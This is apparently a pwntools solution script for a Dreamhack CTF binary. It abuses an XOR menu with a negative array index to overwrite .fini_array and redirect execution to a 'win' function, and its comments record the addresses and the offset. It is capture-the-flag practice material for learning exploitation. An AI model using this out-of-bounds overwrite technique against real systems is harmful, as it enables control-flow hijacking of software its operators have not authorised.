from pwn import *

p = process('./main')
#p = remote('host3.dreamhack.games', 8360)

def xor(a, b):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(a).encode() + b" " + str(b).encode())

xor(63, 63)     # arr[63] = 0
xor(63, 0)
xor(63, 2)
xor(63, 3)
xor(63, 6)
xor(63, 9)      # arr[63] = 0x24d
xor(-85, 63)    # .fini_array ^= arr[63]
p.interactive()

# 0x555555557218 - fini array | 0x5555555551a0
# 0x5555555553ed - win
# 0x5555555574c0 - arr
# offset = -680(-85)
